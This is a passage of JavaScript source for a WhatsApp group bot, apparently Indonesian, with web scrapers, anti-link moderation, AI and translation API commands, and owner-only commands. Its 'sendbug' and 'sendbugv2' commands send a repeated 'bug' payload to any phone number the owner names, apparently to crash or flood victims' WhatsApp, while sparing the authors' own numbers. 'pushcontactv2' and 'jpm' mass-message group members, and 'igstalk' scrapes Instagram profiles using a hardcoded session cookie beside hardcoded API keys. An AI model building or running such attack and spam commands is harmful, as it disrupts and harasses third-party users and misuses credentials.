            const $ = cheerio.load(data);
            const hasil = [];
            $("div.kotodama-list").each(function (l, h) {
              hasil.push({
                link: $(h).find("a").attr("href"),
                gambar: $(h).find("img").attr("data-src"),
                karakter: $(h).find("div.char-name").text().trim(),
                anime: $(h).find("div.anime-title").text().trim(),
                episode: $(h).find("div.meta").text(),
                up_at: $(h).find("small.meta").text(),
                quotes: $(h).find("div.quote").text().trim(),
              });
            });
            resolve(hasil);
          })
          .catch(reject);
      });
    }

    async function obfus(query) {
      return new Promise((resolve, reject) => {
        try {
          const obfuscationResult = jsobfus.obfuscate(query, {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1,
          });
          const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode(),
          };
          resolve(result);
        } catch (e) {
          reject(e);
        }
      });
    }

    async function hentaivid() {
      return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 1153);
        axios.get("https://sfmcompile.club/page/" + page).then((data) => {
          const $ = cheerio.load(data.data);
          const hasil = [];
          $("#primary > div > div > ul > li > article").each(function (a, b) {
            hasil.push({
              title: $(b).find("header > h2").text(),
              link: $(b).find("header > h2 > a").attr("href"),
              category: $(b)
                .find("header > div.entry-before-title > span > span")
                .text()
                .replace("in ", ""),
              share_count: $(b)
                .find("header > div.entry-after-title > p > span.entry-shares")
                .text(),
              views_count: $(b)
                .find("header > div.entry-after-title > p > span.entry-views")
                .text(),
              type: $(b).find("source").attr("type") || "image/jpeg",
              video_1:
                $(b).find("source").attr("src") ||
                $(b).find("img").attr("data-src"),
              video_2: $(b).find("video > a").attr("href") || "",
            });
          });
          resolve(hasil);
        });
      });
    }

    async function igstalk(Username) {
      return new Promise((resolve, reject) => {
        axios
          .get("https://dumpor.com/v/" + Username, {
            headers: {
              cookie:
                "_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8",
              "user-agent":
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
            },
          })
          .then((res) => {
            const $ = cheerio.load(res.data);
            const result = {
              profile: $(
                "#user-page > div.user > div.row > div > div.user__img"
              )
                .attr("style")
                .replace(/(background-image: url\(\'|\'\);)/gi, ""),
              fullname: $(
                "#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1"
              ).text(),
              username: $(
                "#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4"
              ).text(),
              post: $(
                "#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)"
              )
                .text()
                .replace(" Posts", ""),
              followers: $(
                "#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)"
              )
                .text()
                .replace(" Followers", ""),
              following: $(
                "#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)"
              )
                .text()
                .replace(" Following", ""),
              bio: $(
                "#user-page > div.user > div > div.col-md-5.my-3 > div"
              ).text(),
            };
            resolve(result);
          });
      });
    }

    async function replyprem(teks) {
      replygcxeon(
        `This feature is specifically for premium user, contact the owner to become premium user`
      );
    }

    // Autosticker gc
    if (isAutoSticker) {
      if (/image/.test(mime) && !/webp/.test(mime)) {
        let mediac = await quoted.download();
        await XeonBotInc.sendImageAsSticker(from, mediac, m, {
          packname: global.packname,
          author: global.author,
        });
        console.log(`Auto sticker detected`);
      } else if (/video/.test(mime)) {
        if ((quoted.msg || quoted).seconds > 11) return;
        let mediac = await quoted.download();
        await XeonBotInc.sendVideoAsSticker(from, mediac, m, {
          packname: global.packname,
          author: global.author,
        });
      }
    }

    // Anti Link
    if (Antilinkgc) {
      if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins)
          return replygcxeon(
            `${mess.botAdmin}, to kick the person who send link`
          );
        let gclink =
          `https://chat.whatsapp.com/` +
          (await XeonBotInc.groupInviteCode(m.chat));
        let isLinkThisGc = new RegExp(gclink, "i");
        let isgclink = isLinkThisGc.test(m.text);
        if (isgclink)
          return XeonBotInc.sendMessage(m.chat, {
            text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nYou won't be kicked by a bot because what you send is a link to this group`,
          });
        if (isAdmins)
          return XeonBotInc.sendMessage(m.chat, {
            text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to post any link`,
          });
        if (XeonTheCreator)
          return XeonBotInc.sendMessage(m.chat, {
            text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nOwner has sent a link, owner is free to post any link`,
          });
        kice = m.sender;
        await XeonBotInc.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], "remove");
        XeonBotInc.sendMessage(
          from,
          {
            text: `\`\`\`「 Group Link Detected 」\`\`\`\n\n@${
              kice.split("@")[0]
            } Has been kicked because of sending group link in this group`,
            contextInfo: { mentionedJid: [kice] },
          },
          { quoted: m }
        );
      }
    }

    // Antiwame  by Fxyz
    if (antiWame)
      if (budy.includes(`Wa.me`)) {
        if (!isBotAdmins) return;
        bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`;
        if (isAdmins) return replygcxeon(bvl);
        if (m.key.fromMe) return replygcxeon(bvl);
        if (XeonTheCreator) return replygcxeon(bvl);
        kice = m.sender;
        await XeonBotInc.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], "remove");
        XeonBotInc.sendMessage(
          from,
          {
            text: `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${
              kice.split("@")[0]
            } Has been kicked because of sending wa.me link in this group`,
            contextInfo: { mentionedJid: [kice] },
          },
          { quoted: m }
        );
      } else {
      }
    if (antiWame)
      if (budy.includes(`http://wa.me`)) {
        if (!isBotAdmins) return;
        bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`;
        if (isAdmins) return replygcxeon(bvl);
        if (m.key.fromMe) return replygcxeon(bvl);
        if (XeonTheCreator) return replygcxeon(bvl);
        kice = m.sender;
        await XeonBotInc.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], "remove");
        XeonBotInc.sendMessage(
          from,
          {
            text: `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${
              kice.split("@")[0]
            } Has been kicked because of sending wa.me link in this group`,
            contextInfo: { mentionedJid: [kice] },
          },
          { quoted: m }
        );
      } else {
      }
    //antivirtex  by Fxyz
    if (antiVirtex) {
      if (budy.length > 3500) {
        if (!isBotAdmins) return replygcxeon(mess.botAdmin);
        await XeonBotInc.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], "remove");
        XeonBotInc.sendMessage(
          from,
          {
            text: `\`\`\`「 Virus Detected 」\`\`\`\n\n@${
              m.sender.split("@")[0]
            } Has been kicked because of sending virus in this group`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      }
    }
    //anti bad words  by Fxyz
    if (antiToxic)
      if (BadXeon.includes(messagesD)) {
        if (m.text) {
          bvl = `\`\`\`「 Bad Word Detected 」\`\`\`\n\nYou are using bad word but you are an admin/owner that's why i won't kick you😇`;
          if (isAdmins) return replygcxeon(bvl);
          if (m.key.fromMe) return replygcxeon(bvl);
          if (XeonTheCreator) return replygcxeon(bvl);
          await XeonBotInc.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
          await XeonBotInc.groupParticipantsUpdate(
            m.chat,
            [m.sender],
            "remove"
          );
          XeonBotInc.sendMessage(
            from,
            {
              text: `\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${
                m.sender.split("@")[0]
              } was kicked because of using bad words in this group`,
              contextInfo: { mentionedJid: [m.sender] },
            },
            { quoted: m }
          );
        }
      }
    //antilink youtube video by FallZx
    if (AntiLinkYoutubeVid)
      if (budy.includes("https://youtu.be/")) {
        if (!isBotAdmins) return;
        bvl = `\`\`\`「 YoutTube Video Link Detected 」\`\`\`\n\nAdmin has sent a youtube video link, admin is free to send any link😇`;
        if (isAdmins) return replygcxeon(bvl);
        if (m.key.fromMe) return replygcxeon(bvl);
        if (XeonTheCreator) return replygcxeon(bvl);
        await XeonBotInc.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], "remove");
        XeonBotInc.sendMessage(
          from,
          {
            text: `\`\`\`「 YouTube Video Link Detected 」\`\`\`\n\n@${
              m.sender.split("@")[0]
            } Has been kicked because of sending youtube video link in this group`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      } else {
      }
    //antilink youtube channel by FallZx
    if (AntiLinkYoutubeChannel)
      if (budy.includes("https://youtube.com/")) {
        if (!isBotAdmins) return;
        bvl = `\`\`\`「 YoutTube Channel Link Detected 」\`\`\`\n\nAdmin has sent a youtube channel link, admin is free to send any link😇`;
        if (isAdmins) return replygcxeon(bvl);
        if (m.key.fromMe) return replygcxeon(bvl);
        if (XeonTheCreator) return replygcxeon(bvl);
        await XeonBotInc.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], "remove");
        XeonBotInc.sendMessage(
          from,
          {
            text: `\`\`\`「 YouTube Channel Link Detected 」\`\`\`\n\n@${
              m.sender.split("@")[0]
            } Has been kicked because of sending youtube channel link in this group`,
            contextInfo: { mentionedJid: [m.sendet] },
          },
          { quoted: m }
        );
      } else {
      }
    //antilink instagram by FallZx
    if (AntiLinkInstagram)
      if (budy.includes("https://www.instagram.com/")) {
        if (!isBotAdmins) return;
        bvl = `\`\`\`「 Instagram Link Detected 」\`\`\`\n\nAdmin has sent a instagram link, admin is free to send any link😇`;
        if (isAdmins) return replygcxeon(bvl);
        if (m.key.fromMe) return replygcxeon(bvl);
        if (XeonTheCreator) return replygcxeon(bvl);
        await XeonBotInc.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], "remove");
        XeonBotInc.sendMessage(
          from,
          {
            text: `\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${
              m.sender.split("@")[0]
            } Has been kicked because of sending instagram link in this group`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      } else {
      }
    //antilink facebook by FallZx
    if (AntiLinkFacebook)
      if (budy.includes("https://facebook.com/")) {
        if (!isBotAdmins) return;
        bvl = `\`\`\`「 Facebook Link Detected 」\`\`\`\n\nAdmin has sent a facebook link, admin is free to send any link😇`;
        if (isAdmins) return replygcxeon(bvl);
        if (m.key.fromMe) return replygcxeon(bvl);
        if (XeonTheCreator) return replygcxeon(bvl);
        await XeonBotInc.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], "remove");
        XeonBotInc.sendMessage(
          from,
          {
            text: `\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${
              m.sender.split("@")[0]
            } Has been kicked because of sending facebook link in this group`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      } else {
      }
    //antilink telegram by FallZx
    if (AntiLinkTelegram)
      if (budy.includes("https://t.me/")) {
        if (AntiLinkTelegram) if (!isBotAdmins) return;
        bvl = `\`\`\`「 Telegram Link Detected 」\`\`\`\n\nAdmin has sent a telegram link, admin is free to send any link😇`;
        if (isAdmins) return replygcxeon(bvl);
        if (m.key.fromMe) return replygcxeon(bvl);
        if (XeonTheCreator) return replygcxeon(bvl);
        await XeonBotInc.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], "remove");
        XeonBotInc.sendMessage(
          from,
          {
            text: `\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${
              m.sender.split("@")[0]
            } Has been kicked because of sending telegram link in this group`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      } else {
      }
    //antilink tiktok by FallZx
    if (AntiLinkTiktok)
      if (budy.includes("https://www.tiktok.com/")) {
        if (!isBotAdmins) return;
        bvl = `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\nAdmin has sent a tiktok link, admin is free to send any link😇`;
        if (isAdmins) return replygcxeon(bvl);
        if (m.key.fromMe) return replygcxeon(bvl);
        if (XeonTheCreator) return replygcxeon(bvl);
        await XeonBotInc.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], "remove");
        XeonBotInc.sendMessage(
          from,
          {
            text: `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${
              m.sender.split("@")[0]
            } Has been kicked because of sending tiktok link in this group`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      } else {
      }
    //antilink twitter by FallZx
    if (AntiLinkTwitter)
      if (budy.includes("https://twitter.com/")) {
        if (!isBotAdmins) return;
        bvl = `\`\`\`「 Twitter Link Detected 」\`\`\`\n\nAdmin has sent a twitter link, admin is free to send any link😇`;
        if (isAdmins) return replygcxeon(bvl);
        if (m.key.fromMe) return replygcxeon(bvl);
        if (XeonTheCreator) return replygcxeon(bvl);
        await XeonBotInc.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], "remove");
        XeonBotInc.sendMessage(
          from,
          {
            text: `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${
              m.sender.split("@")[0]
            } Has been kicked because of sending twitter link in this group`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      } else {
      }
    //antilink all by FallZx
    if (AntiLinkAll)
      if (budy.includes("https://")) {
        if (!isBotAdmins) return;
        bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`;
        if (isAdmins) return replygcxeon(bvl);
        if (m.key.fromMe) return replygcxeon(bvl);
        if (XeonTheCreator) return replygcxeon(bvl);
        await XeonBotInc.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], "remove");
        XeonBotInc.sendMessage(
          from,
          {
            text: `\`\`\`「 Link Detected 」\`\`\`\n\n@${
              m.sender.split("@")[0]
            } Has been kicked because of sending link in this group`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      } else {
      }
    /*
    if (
      !isCmd &&
      m.isGroup &&
      isAlreadyResponList(m.chat, chath, db_respon_list)
    ) {
      var get_data_respon = getDataResponList(m.chat, chath, db_respon_list);
      if (get_data_respon.isImage === false) {
        XeonBotInc.sendMessage(
          m.chat,
          { text: sendResponList(m.chat, chath, db_respon_list) },
          { quoted: m }
        );
      } else {
        buff = await getBuffer(get_data_respon.image_url);
        XeonBotInc.sendImage(m.chat, buff, `${get_data_respon.response}`, m);
      }
    }

    const nebal = (angka) => {
      return Math.floor(angka);
    };

    if (!isCmd && isAlreadyXeonBotIncList(chath, dblist)) {
      var getraindata = getDataXeonBotIncList(chath, dblist);
      if (getraindata.isImage === false) {
        XeonBotInc.sendMessage(
          m.chat,
          { text: sendXeonBotIncList(chath, dblist) },
          { quoted: m }
        );
      } else {
        buff = await getBuffer(getraindata.image_url);
        XeonBotInc.sendImage(m.chat, buff, `${getraindata.response}`, m);
      }
    }
    */
    if (
      isMedia &&
      m.msg.fileSha256 &&
      m.msg.fileSha256.toString("base64") in global.db.data
    ) {
      let hash = global.db.data[m.msg.fileSha256.toString("base64")];
      let { text, mentionedJid } = hash;
      let messages = await generateWAMessage(
        from,
        { text: text, mentions: mentionedJid },
        {
          userJid: XeonBotInc.user.id,
          quoted: m.quoted && m.quoted.fakeObj,
        }
      );
      messages.key.fromMe = areJidsSameUser(m.sender, XeonBotInc.user.id);
      messages.key.id = m.key.id;
      messages.pushName = m.pushName;
      if (m.isGroup) messages.participant = m.sender;
      let msg = {
        ...chatUpdate,
        messages: [proto.WebMessageInfo.fromObject(messages)],
        type: "append",
      };
      XeonBotInc.ev.emit("messages.upsert", msg);
    }
    //menu thingy
    const timestamp = speed();
    const latensi = speed() - timestamp;
    const mark = "0@s.whatsapp.net";

    //menu image randomizer
    let picaks = [flaming, fluming, flarun, flasmurf];
    let picak = picaks[Math.floor(Math.random() * picaks.length)];

    //emote
    const emote = (satu, dua) => {
      try {
        const { EmojiAPI } = require("emoji-api");
        const emoji = new EmojiAPI();
        emoji.get(satu).then((emoji) => {
          XeonBotInc.sendMessage(
            from,
            { caption: mess.success, image: { url: emoji.images[dua].url } },
            { quoted: m }
          );
        });
      } catch (e) {
        replygcxeon(
          "Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji"
        );
      }
    };

    switch (command) {
      case "public":
        {
          if (!XeonTheCreator) return replygcxeon(mess.owner);
          XeonBotInc.public = true;
          replygcxeon("*Successful in Changing To Public Usage*");
        }
        break;
      case "self":
        {
          if (!XeonTheCreator) return replygcxeon(mess.owner);
          XeonBotInc.public = false;
          replygcxeon("*Successful in Changing To Self Usage*");
        }
        break;
      case "jadibot":
        {
          if (m.isGroup) return replygcxeon(mess.private);
          rentfromxeon(XeonBotInc, m, from);
        }
        break;
      case "listjadibot":
        try {
          let user = [
            ...new Set([
              ...global.conns
                .filter((XeonBotInc) => XeonBotInc.user)
                .map((XeonBotInc) => XeonBotInc.user),
            ]),
          ];
          te = "*List Bot Numpang*\n\n";
          for (let i of user) {
            y = await XeonBotInc.decodeJid(i.id);
            te += " × User : @" + y.split("@")[0] + "\n";
            te += " × Name : " + i.name + "\n\n";
          }
          XeonBotInc.sendMessage(
            from,
            { text: te, mentions: [y] },
            { quoted: m }
          );
        } catch (err) {
          replygcxeon(`There are no users who have rented the bot yet`);
        }
        break;
      case "idgrup":
      case "idgc":
        {
          let anulistg = await store.chats
            .all()
            .filter((v) => v.id.endsWith("@g.us"))
            .map((v) => v.id);
          let teks = `${themeemoji} *GROUP CHAT LIST*\n\nTotal Group : ${anulistg.length} Group\n\n`;
          for (let i of anulistg) {
            let metadata = await XeonBotInc.groupMetadata(i);
            teks += `${themeemoji} *Name :* ${
              metadata.subject
            }\n${themeemoji} *Owner :* ${
              metadata.owner !== undefined
                ? "@" + metadata.owner.split`@`[0]
                : "Unknown"
            }\n${themeemoji} *ID :* ${
              metadata.id
            }\n${themeemoji} *Made :* ${moment(metadata.creation * 1000)
              .tz("Asia/Kolkata")
              .format("DD/MM/YYYY HH:mm:ss")}\n${themeemoji} *Member :* ${
              metadata.participants.length
            }\n\n────────────────────────\n\n`;
          }
          XeonBotInc.sendTextWithMentions(m.chat, teks, m);
        }
        break;
      case "ai":
        {
          if (!q) return replygcxeon(`masukan pertanyaan nya`);
          replygcxeon(mess.wait);
          try {
            let anu = await fetchJson(
              `https://api.zexxadev.repl.co/api/ai/openai?text=${q}`
            );
            if (!anu) return replygcxeon(mess.error);
            if (anu.status == false) return replygcxeon(mess.error);
            XeonBotInc.sendMessage(m.chat, { text: anu.result }, { quoted: m });
          } catch (err) {
            console.log(err);
            return replygcxeon(mess.error);
          }
        }
        break;
      case "aic":
        {
          let [atas, bawah] = text.split`,`;
          if (!atas || !bawah)
            return replygcxeon(
              `Masukan perintah dengan benar .aic karakter,pertanyaan`
            );
          replygcxeon(mess.wait);
          try {
            let anu = await fetchJson(
              `https://api.betabotz.org/api/search/c-ai?prompt=${bawah}&char=${atas}&apikey=pSxJRL2x`
            );
            if (!anu) return replygcxeon(mess.error);
            if (anu.status == false) return replygcxeon(mess.error);
            XeonBotInc.sendMessage(
              m.chat,
              { text: anu.message },
              { quoted: m }
            );
          } catch (err) {
            console.log(err);
            return replygcxeon(mess.error);
          }
        }
        break;
      case "kbbi":
        {
          if (!q) return replygcxeon(`masukan pertanyaan nya`);
          replygcxeon(mess.wait);
          try {
            let anu = await fetchJson(
              `https://api.zahwazein.xyz/information/kbbi?query=${q}&apikey=zenzkey_5fdcdc3f64`
            );
            if (!anu) return replygcxeon(mess.error);
            if (anu.status == false) return replygcxeon(mess.error);
            XeonBotInc.sendMessage(
              m.chat,
              { text: anu.result.title + " : " + anu.result.arti },
              { quoted: m }
            );
          } catch (err) {
            console.log(err);
            return replygcxeon(mess.error);
          }
        }
        break;
      case "trad":
        {
          let [atas, bawah] = text.split`,`;
          if (!atas || !bawah)
            return replygcxeon(
              `Masukan perintah dengan benar .trad kode bahasa,text`
            );
          replygcxeon(mess.wait);
          try {
            let anu = await fetchJson(
              `https://api.akuari.my.id/edukasi/terjemah?query=${bawah}&kode=${atas}`
            );
            if (!anu) return replygcxeon(mess.error);
            if (anu.status == false) return replygcxeon(mess.error);
            XeonBotInc.sendMessage(
              m.chat,
              { text: "Translate : " + anu.result },
              { quoted: m }
            );
          } catch (err) {
            console.log(err);
            return replygcxeon(mess.error);
          }
        }
        break;
      case "chord":
        {
          if (!q) return replygcxeon(`masukan nama lagunya`);
          replygcxeon(mess.wait);
          try {
            let anu = await fetchJson(
              `https://api.zahwazein.xyz/searching/chordlagu?query=${q}&apikey=zenzkey_5fdcdc3f64`
            );
            if (!anu) return replygcxeon(mess.error);
            if (anu.status == false) return replygcxeon(mess.error);
            XeonBotInc.sendMessage(
              m.chat,
              { text: anu.result.chord },
              { quoted: m }
            );
          } catch (e) {
            replygcxeon(mess.error);
          }
        }
        break;
      case "aitxt":
        if (!q) return replygcxeon(`masukan prompt`);
        replygcxeon(mess.wait);
        try {
          let anu = await fetch(
            `https://api.akuari.my.id/ai/prodia?prompt=${q}`
          );
          if (!anu) return replygcxeon(mess.error);
          media = anu;
          XeonBotInc.sendMessage(
            m.chat,
            { image: media, caption: mess.success },
            { quoted: m }
          );
          //await fs.unlinkSync(media);
        } catch (err) {
          console.log(err);
          return replygcxeon(mess.error);
        }
        break;
      case "tohd":
      case "remini":
        {
          if (!quoted) return replygcxeon(`Where is the picture?`);
          if (!/image/.test(mime))
            return replygcxeon(
              `Send/Reply Photos With Captions ${prefix + command}`
            );
          replygcxeon(mess.wait);
          const { remini } = require("./lib/remini");
          let media = await quoted.download();
          let proses = await remini(media, "enhance");
          XeonBotInc.sendMessage(
            m.chat,
            { image: proses, caption: mess.success },
            { quoted: m }
          );
        }
        break;
      case "shutdown":
        if (!XeonTheCreator) return replygcxeon(mess.owner);
        replygcxeon(`Ba bye...`);
        await sleep(3000);
        process.exit();
        break;
      case "owner":
        {
          const repf = await XeonBotInc.sendMessage(
            from,
            {
              contacts: {
                displayName: `${list.length} Contact`,
                contacts: list,
              },
              mentions: [sender],
            },
            { quoted: m }
          );
          XeonBotInc.sendMessage(
            from,
            {
              text: `Hi @${sender.split("@")[0]}, Here is my handsome owner😇`,
              mentions: [sender],
            },
            { quoted: repf }
          );
        }
        break;
      case "sendbugv2":
        {
          if (!XeonTheCreator) return replygcxeon("fitur ini khusus owner bot");
          if (!q)
            return replygcxeon(
              `*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${
                prefix + command
              } number,jumlah\n\n*Contoh:*\n${prefix + command} 628xxxx,5`
            );
          let orang = q.split(",")[0];
          let jumlah = q.split(",")[1];
          if (!orang)
            return replygcxeon(
              `*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${
                prefix + command
              } number,jumlah\n\n*Contoh:*\n${prefix + command} 628xxxx,5`
            );
          if (!jumlah)
            return replygcxeon(
              `*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${
                prefix + command
              } number,jumlah\n\n*Contoh:*\n${prefix + command} 628xxxx,5`
            );
          if (isNaN(parseInt(jumlah)))
            return replygcxeon("Jumlah wajib angka!!");
          let targetnya = orang.replace(/[^0-9]/g, "");
          let jumlahnya = `${encodeURI(jumlah)}`;
          var cekap = await XeonBotInc.onWhatsApp(
            targetnya + "@s.whatsapp.net"
          );
          let target = targetnya + "@s.whatsapp.net";
          if (cekap.length == 0)
            return replygcxeon(
              `Nomor tersebut tidak terdaftar di WhatsApp\nSilahkan kirim nomor yg valid.`
            );
          if (target == "6285789004732@s.whatsapp.net") return;
          if (target == "6283834558105@s.whatsapp.net") return;
          replygcxeon("*Proses⌛*");
          sendDocu(target, jumlahnya);
          await sleep(2000);
          sendviewOnce(target);
          XeonBotInc.sendMessage(from, {
            text: `${command} target @${target.split("@")[0]}, berhasil✅`,
            mentions: [target],
          });
          await sleep(2000);
        }
        break;
      case "sendbug":
        {
          if (!XeonTheCreator)
            return XeonBotInc.sendImageAsSticker(
              from,
              fs.readFileSync("./baselins/stickernye/owner.webp"),
              m,
              {
                packname: "LinsBotz",
                author:
                  "sabar ya\njangan lupa bantu follow\nyt: @LinsBotz\nig: rijalsavior",
              },
              { quoted: m }
            );
          if (!q)
            return replygcxeon(
              `*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${
                prefix + command
              } number,jumlah\n\n*Contoh:*\n${prefix + command} 628xxxx,20`
            );
          let orang = q.split(",")[0];
          let jumlah = q.split(",")[1];
          if (!orang)
            return replygcxeon(
              `*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${
                prefix + command
              } number,jumlah\n\n*Contoh:*\n${prefix + command} 628xxxx,20`
            );
          if (!jumlah)
            return replygcxeon(
              `*FORMAT BUG ${command.toUpperCase()}*\n\n*Example:*\n${
                prefix + command
              } number,jumlah\n\n*Contoh:*\n${prefix + command} 628xxxx,20`
            );
          if (isNaN(parseInt(jumlah)))
            return replygcxeon("Jumlah wajib angka!!");
          let targetnya = orang.replace(/[^0-9]/g, "");
          let jumlahnya = `${encodeURI(jumlah)}`;
          var cekap = await XeonBotInc.onWhatsApp(
            targetnya + "@s.whatsapp.net"
          );
          let target = targetnya + "@s.whatsapp.net";
          if (cekap.length == 0)
            return replygcxeon(
              `Nomor tersebut tidak terdaftar di WhatsApp\nSilahkan kirim nomor yg valid.`
            );
          if (target == "6281911317205@s.whatsapp.net") return;
          if (target == "6281252352238@s.whatsapp.net") return;
          XeonBotInc.sendImageAsSticker(
            from,
            fs.readFileSync("./baselins/stickernye/wait.webp"),
            m,
            {
              packname: "LinsBotz",
              author:
                "sabar ya\njangan lupa bantu follow\nyt: @LinsBotz\nig: rijalsavior",
            },
            { quoted: m }
          );
          await sleep(1000);
          sendBug2(target, jumlahnya);
          await sleep(2000);
          sendviewOnce(target);
          XeonBotInc.sendImageAsSticker(
            from,
            fs.readFileSync("./baselins/stickernye/sukses.webp"),
            m,
            {
              packname: "Pesanan Telah Selesai",
              author:
                "Jangan Lupa Follow me\nyoutube: @LinsBotz\nig: rijalsavior",
            },
            { quoted: m }
          );
          await sleep(2000);
        }
        break;
      case "animek":
        {
          if (!q) return reply(`masukan link tiktok`);
          let res = await fetch(
            `https://api.shinoa.xyz/api/anime/komiku?query=hyouka&apikey=451c1a14`
          );
          let data = await res.json();
          let json = data.result;
          let cap = `title ${json.title}
description ${json.description}`;
          XeonBotInc.sendMessage(
            m.chat,
            { video: { url: json.thumbnail }, caption: cap },
            { quoted: m }
          );
        }
        break;
      case "pushcontactv2":
        if (!XeonTheCreator) return khususOwner();
        if (msg.isGroup)
          return reply(`Fitur Ini Hanya Bisa Digunakan Di Private Chat`);
        if (!q)
          return reply(
            `Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${
              prefix + command
            } idgroup|tekspushkontak\nUntuk Liat Id Group Silahkan Ketik .idgroup`
          );
        await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_");
        const hay = q.split("|")[1];
        const groupMetadataa = !m.isGroup
          ? await XeonBotInc.groupMetadata(`${q.split("|")[0]}`).catch(
              (e) => {}
            )
          : "";
        const participantss = !m.isGroup
          ? await groupMetadataa.participants
          : "";
        const halls = await participantss
          .filter((v) => v.id.endsWith(".net"))
          .map((v) => v.id);
        for (let mem of halls) {
          XeonBotInc.sendMessage(mem, { text: hay });
          await sleep(2000);
        }
        reply("*SUCCESFUL ✅*");
        break;
      case "jpm":
      case "post":
        {
          if (!XeonTheCreator) return khususOwner();
          if (!text)
            return reply(
              `*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${
                prefix + command
